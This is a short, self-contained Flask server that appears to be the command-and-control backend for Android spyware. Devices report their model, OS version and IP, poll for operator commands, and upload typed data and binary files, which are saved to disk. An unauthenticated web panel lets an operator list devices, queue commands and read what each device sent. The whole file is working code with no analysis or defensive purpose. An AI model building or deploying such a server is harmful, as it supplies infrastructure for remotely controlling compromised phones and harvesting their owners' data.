from flask import Flask, request, jsonify, send_from_directory
import json, time, os
from datetime import datetime

app = Flask(__name__)
DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)

devices = {}
commands = {}
uploads = {}

@app.route("/api/heartbeat", methods=["POST"])
def heartbeat():
    body = request.get_json(force=True)
    did = body.get("device_id")
    devices[did] = {"last_seen": time.time(), "model": body.get("model"), "android": body.get("android"), "lang": body.get("lang"), "ip": body.get("ip")}
    return jsonify({"ok": 1})

@app.route("/api/cmd", methods=["GET"])
def get_cmd():
    did = request.args.get("device_id")
    if did in commands and commands[did]: return jsonify(commands[did].pop(0))
    return jsonify({})

@app.route("/api/upload", methods=["POST"])
def upload():
    body = request.get_json(force=True)
    did = body.get("device_id"); typ = body.get("type"); data = body.get("data")
    if did not in uploads: uploads[did] = []
    uploads[did].append({"type": typ, "data": data, "ts": datetime.utcnow().isoformat()})
    path = os.path.join(DATA_DIR, f"{did}_{typ}_{int(time.time())}.json")
    with open(path, "w", encoding="utf-8") as f: json.dump(data, f, ensure_ascii=False, indent=2)
    return jsonify({"ok": 1})

@app.route("/api/upload_bin", methods=["POST"])
def upload_bin():
    did = request.headers.get("X-Device"); typ = request.headers.get("X-Type", "bin"); data = request.get_data()
    path = os.path.join(DATA_DIR, f"{did}_{typ}_{int(time.time())}.bin")
    with open(path, "wb") as f: f.write(data)
    return jsonify({"ok": 1})

@app.route("/panel/devices")
def list_devices(): return jsonify(devices)

@app.route("/panel/push", methods=["POST"])
def push_cmd():
    body = request.get_json(force=True)
    did = body.get("device_id")
    if did not in commands: commands[did] = []
    commands[did].append(body)
    return jsonify({"ok": 1})

@app.route("/panel/data/<did>")
def get_data(did): return jsonify(uploads.get(did, []))

@app.route("/")
def index(): return send_from_directory(".", "panel.html")

if __name__ == "__main__": app.run(host="0.0.0.0", port=8080, debug=False)
